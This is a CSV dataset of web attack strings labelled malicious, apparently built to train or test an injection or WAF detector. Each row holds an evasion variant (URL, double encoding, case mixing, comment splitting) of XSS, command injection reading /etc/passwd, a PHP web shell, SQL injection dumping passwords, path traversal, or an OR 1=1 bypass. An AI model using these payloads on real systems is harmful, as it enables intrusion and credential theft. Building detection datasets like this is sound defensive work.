request_string,label,technique,base_sample_id
<img/**/src=x/**/onerrO/**/R=AL/**/ERT(1)>,1,sql_comment_injection,mal_0008
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,1,double_encoding,mal_0008
%7C%20cat%20%2Fetc%2Fpasswd,1,url_encode_full,mal_0009
|%20cat%20/etc/passwd,1,url_encode_partial,mal_0009
| CaT /eTc/pAsSwD,1,case_mixing,mal_0009
|/**/cat/**//etc/passwd,1,sql_comment_injection,mal_0009
%257C%2520cat%2520%252Fetc%252Fpasswd,1,double_encoding,mal_0009
%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E,1,url_encode_full,mal_0010
%3C?php%20system%28$_GET[%27cmd%27]%29%3B%20?%3E,1,url_encode_partial,mal_0010
<?PhP SyStEm($_gEt['CmD']); ?>,1,case_mixing,mal_0010
<?php/**/system($_GET['cmd']);/**/?>,1,sql_comment_injection,mal_0010
%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E,1,double_encoding,mal_0010
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,1,url_encode_full,mal_0011
%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1,url_encode_partial,mal_0011
<sCrIpT>AlErT('xSs')</ScRiPt>,1,case_mixing,mal_0011
<SCR/**/IPT>AL/**/ERT('XSS')</SCR/**/IPT>,1,sql_comment_injection,mal_0011
%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E,1,double_encoding,mal_0011
1%20UNION%20SELECT%20null%2C%20username%2C%20password%20FROM%20users--,1,url_encode_full,mal_0012
"1%20UNION%20SELECT%20null,%20username,%20password%20FROM%20users--",1,url_encode_partial,mal_0012
"1 UnIoN SeLeCt nUlL, uSeRnAmE, pAsSwOrD FrOm uSeRs--",1,case_mixing,mal_0012
"1/**/UN/**/ION/**/SEL/**/ECT/**/null,/**/username,/**/passwO/**/Rd/**/FR/**/OM/**/users--",1,sql_comment_injection,mal_0012
1%2520UNION%2520SELECT%2520null%252C%2520username%252C%2520password%2520FROM%2520users--,1,double_encoding,mal_0012
1%27%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2C2%2C3%2Ctable_name%20FROM%20information_schema.tables--,1,url_encode_full,mal_0013
"1%27%20AND%201%3D1%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables--",1,url_encode_partial,mal_0013
"1' aNd 1=1 uNiOn aLl sElEcT 1,2,3,TaBlE_NaMe fRoM InFoRmAtIoN_ScHeMa.tAbLeS--",1,case_mixing,mal_0013
"1'/**/A/**/ND/**/1=1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/1,2,3,table_name/**/FR/**/OM/**/infO/**/Rmation_schema.tables--",1,sql_comment_injection,mal_0013
1%2527%2520AND%25201%253D1%2520UNION%2520ALL%2520SELECT%25201%252C2%252C3%252Ctable_name%2520FROM%2520information_schema.tables--,1,double_encoding,mal_0013
..%2F..%2F..%2F..%2Fetc%2Fpasswd,1,url_encode_full,mal_0014
../../../../EtC/PaSsWd,1,case_mixing,mal_0014
..%252F..%252F..%252F..%252Fetc%252Fpasswd,1,double_encoding,mal_0014
%27%20OR%201%3D1%23,1,url_encode_full,mal_0015
%27%20OR%201%3D1#,1,url_encode_partial,mal_0015
' Or 1=1#,1,case_mixing,mal_0015
'/**/O/**/R/**/1=1#,1,sql_comment_injection,mal_0015
%2527%2520OR%25201%253D1%2523,1,double_encoding,mal_0015
